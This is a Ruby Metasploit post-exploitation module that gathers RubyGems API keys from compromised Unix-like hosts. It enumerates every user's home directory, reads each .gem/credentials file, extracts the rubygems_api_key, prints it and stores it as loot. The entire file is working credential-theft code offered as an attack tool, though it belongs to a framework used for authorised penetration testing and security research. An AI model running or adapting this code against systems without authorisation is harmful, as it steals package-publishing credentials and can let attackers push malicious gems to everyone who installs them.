##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'yaml'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'RubyGems API Key Gather ./gem/credentials',
      'Description'   => %q{
        Post Module to obtain a users RubyGems API Key from ./gem/credentials
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Jonathan Claudius <jclaudius[at]trustwave.com>',
                           'Brandon Myers <bmyers[at]trustwave.com>' ],
      'Platform'      => %w{ bsd linux osx unix },
      'SessionTypes'  => [ 'shell' ]
    ))
  end

  def run
    print_status("Finding .gem/credentials")
    paths = enum_user_directories.map {|d| d + "/.gem/credentials"}
    paths = paths.select { |f| file?(f) }

    if paths.nil? or paths.empty?
      print_error("No users found with a .gem/credentials file")
      return
    end

    download_loot(paths)
  end

  def download_loot(paths)
    print_status("Looting #{paths.count} files")
    paths.each do |path|
      path.chomp!
      next if [".", ".."].include?(path)

      if key = YAML.load(read_file(path))[:rubygems_api_key]
        rubygems_api_key = key
      else
        next
      end

      print_good("Found a RubyGems API Key: #{rubygems_api_key}")

      loot_path = store_loot("host.rubygems.apikey",
                             "text/plain",
                             session,
                             rubygems_api_key,
                             "ruby_api_key.txt",
                             "Ruby API Key")

      print_status("RubyGems API Key stored in: #{loot_path.to_s}")
    end
  end
end
